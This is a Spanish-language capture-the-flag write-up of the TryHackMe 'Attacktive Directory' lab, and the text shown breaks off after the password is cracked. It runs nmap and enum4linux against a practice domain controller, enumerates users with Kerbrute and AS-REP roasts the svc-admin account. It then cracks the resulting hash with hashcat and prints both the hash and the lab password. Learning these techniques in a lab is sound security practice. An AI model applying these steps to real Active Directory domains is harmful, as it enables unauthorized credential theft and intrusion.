# Sala virtual Attacktive Directory
El 99% de las redes corporativas funcionan con AD. Pero, ¿Puedes explotar un Domain Controller vulnerable?

## Conceptos previos
#### ¿Qué es Impacket?

Impacket es una colección de clases de Python para trabajar con protocolos de red. Impacket se centra en proporcionar acceso programático de bajo nivel a los paquetes y, para algunos protocolos (por ejemplo, SMB1-3 y MSRPC), la implementación del protocolo en sí.
## Programas necesarios

### Impacket
#### Instalación

Ejecutar los siguientes comandos:
~~~
sudo git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket
sudo pip3 install -r /opt/impacket/requirements.txt
sudo cd /opt/impacket/
sudo pip3 install .
sudo python3 setup.py install
~~~

### Kerbrute
#### Instalación
Ejecutar los siguientes comandos:
~~~
sudo git clone https://github.com/ropnop/kerbrute
cd kerbrute
go build .
~~~

# Comenzamos!!!
Para mí la IP de la máquina virtual que esta en mi red es 10.10.35.36. A ustedes les puede dar una IP distinta así que recuerde cambiarla al momento de realizar los pasos.
## 1. Fase de Descubrimiento
Verificamos si tenemos traza ICMP con la máquina virtual con el siguiente comando.

    ping -c 1 10.10.35.36

![img1](/home/hiteek/Github/TryHackMe/AttacktiveDirectory/img/img1.png)

Si podemos enviar paquetes además como el ttl es 127 podemos decir que se trata de una máquina Windows.

Para un escano rapido y centrado en el Active Directory podemos usar la herramienta **enum4linux**.

![img3](/home/hiteek/Github/TryHackMe/AttacktiveDirectory/img/img3.png)

Para un escaneo más exhaustivo utilizaremos la herramienta **Nmap**.

    nmap -p- --open -T5 -v -n 10.10.35.36

![img2](/home/hiteek/Github/TryHackMe/AttacktiveDirectory/img/img2.png)

Luego lanzaremos una serie de scrips básicos de enumeración sobre los puertos abiertos con **Nmap**.

    nmap -sC -sV -p53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,47001,49664,49665,49667,49669,49672,49675,49676,49679,49684,49696 10.10.35.36

~~~
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-20 16:35 -05
Nmap scan report for 10.10.35.36
Host is up (0.19s latency).

PORT      STATE  SERVICE       VERSION
53/tcp    open   domain        Simple DNS Plus
80/tcp    open   http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open   kerberos-sec  Microsoft Windows Kerberos (server time: 2021-04-20 21:35:55Z)
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open   ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp   open   microsoft-ds?
464/tcp   open   kpasswd5?
593/tcp   open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open   tcpwrapped
3268/tcp  open   ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp  open   tcpwrapped
3389/tcp  open   ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2021-04-20T21:36:47+00:00
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2021-04-19T19:58:44
|_Not valid after:  2021-10-19T19:58:44
|_ssl-date: 2021-04-20T21:36:56+00:00; 0s from scanner time.
5985/tcp  open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open   mc-nmf        .NET Message Framing
47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open   msrpc         Microsoft Windows RPC
49665/tcp open   msrpc         Microsoft Windows RPC
49667/tcp closed unknown
49669/tcp open   msrpc         Microsoft Windows RPC
49672/tcp open   msrpc         Microsoft Windows RPC
49675/tcp open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open   msrpc         Microsoft Windows RPC
49679/tcp open   msrpc         Microsoft Windows RPC
49684/tcp closed unknown
49696/tcp open   msrpc         Microsoft Windows RPC
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2021-04-20T21:36:50
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 74.70 seconds
~~~

Nos fijamos en el puerto 3389 que nos muestra el NetBIOS_Domain_Name y el TLD.

Ahora con la [lista de usuarios](https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt) potenciales del DC que nos dio la pagina y la herramienta **Kerbrute** podemos enumerar los usarios validos del Dominio.

![img4](/home/hiteek/Github/TryHackMe/AttacktiveDirectory/img/img4.png)

Para ello ejecutaremos el siguiente comando dentro de la carpeta de Kerbrute.

    ./kerbrute userenum --dc 10.10.35.36 -d spookysec.local userlist.txt

![img6](/home/hiteek/Github/TryHackMe/AttacktiveDirectory/img/img6.png)

Como atacantes de la lista de usuarios validos nos llaman la atención dos usuarios: svc-admin y backup

Genial! Ahora que conocemos que usuarios son validos podemos usar la herramienta **GetNPUsers.py** para saber que usuarios no requieren de autenticacion previa. La autenticación previa es el primer paso en la autenticación Kerberos y está diseñada para evitar ataques de adivinación de contraseñas por fuerza bruta.

![img7](/home/hiteek/Github/TryHackMe/AttacktiveDirectory/img/img7.png)

El usuario svc-admin es ASReproastable ya que no tiene autenticacion previa. Ademas nos devolvio un hash al final.

    $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:20d39c6093746fe66f77e1c216eebd50$046a49cb21dd0d99a1f4a120e33899b1120692b15d573315e3f280b3322990a46825b971297a0a9c886a0789016b169a39b6a5490282bc62eace54a2b0ca68d9c6fa203de6c7fbc918d2ecca015df55c11e3520902b6a95d9e19291094604a4d114e64ce7b7bc1ba4af85522753732843876dbc86cef2693f597c2e8c6ced716b6046f9748f926d344223d41324aace0085154b8a6380af0f99868edd71c4bd1bce4eb4b7bb3e88ff242725486b396c354ec8af82fe51dd056a72c4f2c6bce9060d69b66b90396a523ee02f8ca1fee5d0a5e32f3422f75c80c48a4b6ff90d8bb96fff40d59d03ddb76536aeb1d501e76692a

## 2. Fase de Ataque

Haciendo uso de la herramienta **hashcat** vamos a crackear el hash que obtuvimos pero antes debemos saber que tipo de hash es para ello hashcat nos da varios ejemplos con la opción --example-hashes.

    hashcat --example-hashes | grep "krb5asr" -B 3

![img8](/home/hiteek/Github/TryHackMe/AttacktiveDirectory/img/img8.png)

Ahora que sabemos que es un hash de tipo Kerberos 5 AS-REP etype 23 modo 18200 ya podremos romperlo con hashcat usando la [lista de contraseñas](https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt) que nos da la pagina.

    hashcat -m 18200 -a 0 hash passwordlist.txt

Donde -m indica el modo, con -a indicamos el modo de ataque, el hash que mostramos anteriormente esta en un archivo llamado hash y passwordlist.txt es el archivo que contiene todas las contraseñas potenciales que nos dio la página.

Para mostrar el resultado usaremos el comando:

    hashcat -m 18200 -a 0 hash passwordlist.txt --show


![img9](/home/hiteek/Github/TryHackMe/AttacktiveDirectory/img/img9.png)

La contraseña del usuario svc-admin es management2005
